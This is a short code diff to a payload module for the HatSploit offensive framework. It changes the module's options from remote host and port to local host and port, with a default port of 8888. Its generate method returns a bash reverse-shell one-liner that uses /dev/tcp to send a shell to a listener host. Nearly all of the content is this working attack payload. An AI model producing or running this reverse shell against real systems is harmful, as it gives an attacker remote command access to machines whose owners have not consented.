@@ -37,20 +37,20 @@ class HatSploitPayload(HatSploitPayload):
     }
     
     options = {
-        'RHOST': {
-            'Description': "Remote host.",
+        'LHOST': {
+            'Description': "Local host.",
             'Value': None,
             'Type': "ip",
             'Required': True
         },
-        'RPORT': {
-            'Description': "Remote port.",
-            'Value': None,
+        'LPORT': {
+            'Description': "Local port.",
+            'Value': 8888,
             'Type': "port",
             'Required': True
         }
     }
     
     def generate(self):
-        remote_host, remote_port = self.parser.parse_options(self.options)
-        return f"/bin/sh &>/dev/tcp/{remote_host}/{remote_port} 0>&1"
+        local_host, local_port = self.parser.parse_options(self.options)
+        return f"/bin/sh &>/dev/tcp/{local_host}/{local_port} 0>&1"
